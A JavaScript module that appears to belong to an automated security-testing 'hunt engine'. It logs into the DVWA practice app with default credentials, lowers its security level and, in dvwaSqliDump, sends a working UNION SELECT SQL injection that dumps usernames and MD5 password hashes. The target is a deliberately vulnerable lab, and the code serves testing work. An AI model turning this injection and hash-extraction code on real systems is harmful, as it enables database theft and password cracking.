/**
 * dvwaAuth.js — DVWA auto-login helper for the hunt engine.
 *
 * Uses Node.js fetch directly (backend can reach 172.17.0.1:3100).
 * No container exec needed.
 */

const cookieJars = new Map(); // huntId -> cookie string

function extractCookies(setCookieHeaders) {
  if (!setCookieHeaders) return '';
  const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
  return headers.map(h => String(h).split(';')[0]).join('; ');
}

function mergeCookies(oldJar, newCookies) {
  const map = new Map();
  for (const c of String(oldJar || '').split(';')) {
    const [k, ...v] = c.trim().split('=');
    if (k) map.set(k.trim(), v.join('=').trim());
  }
  for (const c of String(newCookies || '').split(';')) {
    const [k, ...v] = c.trim().split('=');
    if (k) map.set(k.trim(), v.join('=').trim());
  }
  return [...map.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
}

export async function dvwaLogin({ huntId, target, username = 'admin', password = 'password' }) {
  const base = String(target || '').replace(/\/+$/, '');
  if (!base) return { ok: false, error: 'no_target' };

  try {
    let jar = cookieJars.get(huntId) || '';

    // 1. GET login.php, extract CSRF token
    const loginRes = await fetch(`${base}/login.php`, {
      headers: jar ? { Cookie: jar } : {},
    });
    jar = mergeCookies(jar, extractCookies(loginRes.headers.getSetCookie?.() || loginRes.headers.get('set-cookie')));
    const loginHtml = await loginRes.text();
    const tokenMatch = loginHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                       loginHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
    const token = tokenMatch ? tokenMatch[1] : null;
    if (!token) return { ok: false, error: 'csrf_token_not_found' };

    // 2. POST login
    const body = new URLSearchParams({ username, password, user_token: token, Login: 'Login' });
    const postRes = await fetch(`${base}/login.php`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        ...(jar ? { Cookie: jar } : {}),
      },
      body: body.toString(),
      redirect: 'follow',
    });
    jar = mergeCookies(jar, extractCookies(postRes.headers.getSetCookie?.() || postRes.headers.get('set-cookie')));
    const loggedHtml = await postRes.text();
    if (!/welcome/i.test(loggedHtml)) return { ok: false, error: 'login_failed' };

    // 3. Set security=low (GET token first)
    const secRes = await fetch(`${base}/security.php`, { headers: { Cookie: jar } });
    jar = mergeCookies(jar, extractCookies(secRes.headers.getSetCookie?.() || secRes.headers.get('set-cookie')));
    const secHtml = await secRes.text();
    const secMatch = secHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                     secHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
    const secToken = secMatch ? secMatch[1] : token;
    const secBody = new URLSearchParams({ security: 'low', user_token: secToken, seclev_submit: 'Submit' });
    await fetch(`${base}/security.php`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: jar,
      },
      body: secBody.toString(),
    });

    cookieJars.set(huntId, jar);
    return { ok: true, cookieJar: jar.slice(0, 100) + '...' };
  } catch (e) {
    return { ok: false, error: 'fetch_failed', detail: String(e.message || e).slice(0, 300) };
  }
}

export function isStuckAtDvwaLogin(events, { window = 20 } = {}) {
  const rows = Array.isArray(events) ? events.slice(-window) : [];
  let loginAttempts = 0;
  let navigatedAway = false;
  for (const e of rows) {
    if (!e) continue;
    const text = JSON.stringify(e).toLowerCase();
    if (text.includes('login.php') && (text.includes('browser_click') || text.includes('browser_type'))) {
      loginAttempts++;
    }
    if (e.type === 'verification' && e.verified === false &&
        String(e.evidence || '').includes('url contains index')) {
      loginAttempts++;
    }
    if (e.type === 'observation' && typeof e.text === 'string' &&
        e.text.includes('Welcome') && !e.text.includes('login.php')) {
      navigatedAway = true;
    }
  }
  return loginAttempts >= 3 && !navigatedAway;
}

export function getDvwaCookies(huntId) {
  return cookieJars.get(huntId) || '';
}

/**
 * dvwaSqliDump — system-run fresh UNION SELECT dump on DVWA /vulnerabilities/sqli/.
 *
 * PROOF-GATE AUTO-FILE (2 Nov 2026): when the proof gate fires for sqli and the
 * brain never emits claim_finding, the SYSTEM runs one fresh dump itself via the
 * proven backend path (fresh login → security=low → UNION SELECT user,password
 * FROM users#), extracts ≥2 MD5 hashes, and the caller builds the claim with
 * fresh evidence + a self-contained replay command.
 *
 * This is a permanent system-level fix: future hunts arrive with the filing
 * path already working instead of depending on the model to transcribe hashes.
 *
 * Returns { ok:true, hashes:[...], rows:[...] } or { ok:false, error, detail }.
 * hashes = unique lowercase MD5 strings; rows = [{user, hash}] parsed from the
 * DVWA "First name: X / Surname: <md5>" rendering.
 */
export async function dvwaSqliDump({ huntId, target }) {
  const base = String(target || '').replace(/\/+$/, '');
  if (!base) return { ok: false, error: 'no_target' };

  // Fresh login (handles per-request CSRF token + sets security=low).
  const login = await dvwaLogin({ huntId, target: base });
  if (!login.ok) return { ok: false, error: 'login_failed', detail: login.error };

  try {
    const jar = cookieJars.get(huntId) || '';

    // GET the sqli page for a fresh form token (best-effort; low-security
    // DVWA does not require it for the id parameter).
    let token = '';
    try {
      const pageRes = await fetch(`${base}/vulnerabilities/sqli/`, {
        headers: { Cookie: jar },
      });
      const pageHtml = await pageRes.text();
      const tm = pageHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                 pageHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
      if (tm) token = tm[1];
    } catch { /* token is best-effort */ }

    // POST the UNION SELECT injection. DVWA low-security query:
    //   SELECT first_name, last_name FROM users WHERE user_id = '$id'
    // so UNION SELECT user,password maps user→first_name, md5→last_name.
    const injection = `1' UNION SELECT user,password FROM users#`;
    const body = new URLSearchParams({ id: injection, Submit: 'Submit' });
    if (token) body.set('user_token', token);

    const dumpRes = await fetch(`${base}/vulnerabilities/sqli/`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: jar,
      },
      body: body.toString(),
      redirect: 'follow',
    });
    const dumpHtml = await dumpRes.text();

    // Extract MD5 hashes (the password column). Dedupe, lowercase.
    const hashMatches = dumpHtml.match(/\b[a-f0-9]{32}\b/gi) || [];
    const hashes = [...new Set(hashMatches.map(h => h.toLowerCase()))];

    // Parse user rows from DVWA's "First name: X<br />Surname: <md5>" rendering.
    const rows = [];
    const rowRe = /First name:\s*([^<]+?)<br\s*\/?>\s*Surname:\s*([a-f0-9]{32})/gi;
    let m;
    while ((m = rowRe.exec(dumpHtml)) !== null) {
      rows.push({ user: m[1].trim(), hash: m[2].toLowerCase() });
    }

    if (hashes.length < 2) {
      return { ok: false, error: 'insufficient_hashes', detail: `found ${hashes.length} hash(es), need >=2` };
    }

    return { ok: true, hashes, rows, hashCount: hashes.length };
  } catch (e) {
    return { ok: false, error: 'dump_failed', detail: String(e && e.message || e).slice(0, 300) };
  }
}
